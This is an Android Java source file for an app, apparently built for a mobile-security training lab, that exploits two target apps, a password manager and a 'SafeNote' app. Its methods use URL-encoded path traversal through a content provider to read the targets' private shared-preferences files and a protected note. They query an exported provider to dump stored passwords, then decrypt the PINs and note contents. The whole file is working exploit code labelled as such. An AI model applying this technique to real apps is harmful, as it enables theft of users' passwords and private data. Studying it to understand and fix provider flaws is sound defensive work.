package com.example.exploitemapapp;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.EditText;

import androidx.appcompat.app.AppCompatActivity;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.util.Hashtable;

public class MainActivity extends AppCompatActivity {
    private EditText md5;
    private EditText pwdPin;
    private EditText safeNotePin;
    private EditText plainTextNote;
    private EditText md5_safe_note;
    private UtilityPwd utilityPwd;
    private String databasePwdManager;
    private Hashtable<String, String> sharePreferencePwdManager = new Hashtable<String, String>();
    private Hashtable<String, String> sharePreferenceSafeNote = new Hashtable<String, String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        setContentView(R.layout.activity_main);
        md5 = findViewById(R.id.md5);
        pwdPin = findViewById(R.id.pwdPin);
        safeNotePin = findViewById(R.id.safeNotePin);
        plainTextNote = findViewById(R.id.plainTextNote);
        md5_safe_note = findViewById(R.id.md5_safe_note);

        readSharePreferencePwdManagerViaProvider();
        readSharePreferenceSafeNoteViaProvider();
        utilityPwd = new UtilityPwd(sharePreferencePwdManager.get("MD5_PIN"));

        md5.setText(sharePreferencePwdManager.get("MD5_PIN"));
        pwdPin.setText(utilityPwd.xor(sharePreferencePwdManager.get("XORED_PIN")));
        exploiteDatabaseViaProvider();
        String[] pwdSafenoteDB = databasePwdManager.split(" ");
        String safeNotePinView = "";
        for (int i = 2; i < pwdSafenoteDB.length; i = i + 3) {
            safeNotePinView += pwdSafenoteDB[i - 1] + " " + utilityPwd.decrypt(pwdSafenoteDB[i]) + "\n";
        }
        safeNotePin.setText(safeNotePinView);
        md5_safe_note.setText(sharePreferenceSafeNote.get("MD5_PIN"));
        exploitProvider();
    }

    private void readSharePreferencePwdManagerViaProvider() {
        try {
            String pathtraversal = "..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.els.pwdmanager%2Fshared_prefs%2Fpwdmanager_conf.xml"; // read Congratulations.txt file of SafeNote

            ContentResolver cr = this.getContentResolver();
            FileInputStream fis = (FileInputStream) cr.openInputStream(Uri.parse("content://com.els.safenote/" + pathtraversal));
            BufferedReader r = new BufferedReader(new InputStreamReader(fis));
            String mLine;
            String plainText = "";
            while ((mLine = r.readLine()) != null) {
                plainText += mLine;
            }
            fis.close();

            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(true);
            XmlPullParser xpp = factory.newPullParser();
            xpp.setInput(new StringReader(plainText));
            int eventType = xpp.getEventType();
            String key = "";
            String value = "";

            while (eventType != XmlPullParser.END_DOCUMENT) {
                if (eventType == XmlPullParser.START_TAG) {
                    if (xpp.getName().equals("string")) {
                        key = xpp.getAttributeValue(null, "name");
                    }
                } else if (eventType == XmlPullParser.TEXT) {
                    value = xpp.getText();
                } else if (eventType == XmlPullParser.END_TAG) {
                    if (xpp.getName().equals("string")) {
                        sharePreferencePwdManager.put(key, value);
                    }
                }
                eventType = xpp.next();
            }
        } catch (IOException | XmlPullParserException e) {
            e.printStackTrace();
        }
    }

    private void readSharePreferenceSafeNoteViaProvider() {
        try {
            String pathtraversal = "..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.els.safenote%2Fshared_prefs%2Fsafenote_conf.xml"; // read Congratulations.txt file of SafeNote

            ContentResolver cr = this.getContentResolver();
            FileInputStream fis = (FileInputStream) cr.openInputStream(Uri.parse("content://com.els.safenote/" + pathtraversal));
            BufferedReader r = new BufferedReader(new InputStreamReader(fis));
            String mLine;
            String plainText = "";
            while ((mLine = r.readLine()) != null) {
                plainText += mLine;
            }
            fis.close();

            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(true);
            XmlPullParser xpp = factory.newPullParser();
            xpp.setInput(new StringReader(plainText));
            int eventType = xpp.getEventType();
            String key = "";
            String value = "";

            while (eventType != XmlPullParser.END_DOCUMENT) {
                if (eventType == XmlPullParser.START_TAG) {
                    if (xpp.getName().equals("string")) {
                        key = xpp.getAttributeValue(null, "name");
                    }
                } else if (eventType == XmlPullParser.TEXT) {
                    value = xpp.getText();
                } else if (eventType == XmlPullParser.END_TAG) {
                    if (xpp.getName().equals("string")) {
                        sharePreferenceSafeNote.put(key, value);
                    }
                }
                eventType = xpp.next();
            }
        } catch (IOException | XmlPullParserException e) {
            e.printStackTrace();
        }
    }

    public void exploiteDatabaseViaProvider() { //exploit database over content provider
        try {
            Uri uri = Uri.parse("content://com.els.pwdmanager.contentprovider/pwds");
            String[] cols = new String[]{"_id", "name", "pwd"};
            ContentResolver cr = getContentResolver();
            Cursor c = cr.query(uri, cols, null, null, null);
            if (c.moveToFirst()) {
                do {
                    databasePwdManager += c.getString(0) + " " + c.getString(1) + " " + c.getString(2) + " ";
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void exploitProvider(){// exploit path traversal over content provider
        try {
            String pathtraversal = "..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.els.safenote%2Ffiles%2FCongratulations.txt"; // read Congratulations.txt file of SafeNote

            ContentResolver cr = this.getContentResolver();
            FileInputStream fis = (FileInputStream) cr.openInputStream(Uri.parse("content://com.els.safenote/" + pathtraversal));
            BufferedReader r = new BufferedReader(new InputStreamReader(fis));
            String mLine;
            String plainText = "";
            while ((mLine = r.readLine()) != null) {
                plainText += mLine;
            }
            fis.close();

            Log.d("Plain Text: ", plainText);
            utilityPwd = new UtilityPwd(sharePreferenceSafeNote.get("MD5_PIN"));
            String encrypted = utilityPwd.decrypt(plainText);
            Log.d("Decrypt: ", encrypted);
            plainTextNote.setText(encrypted);
            Log.d("Exploit: ", "Success");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}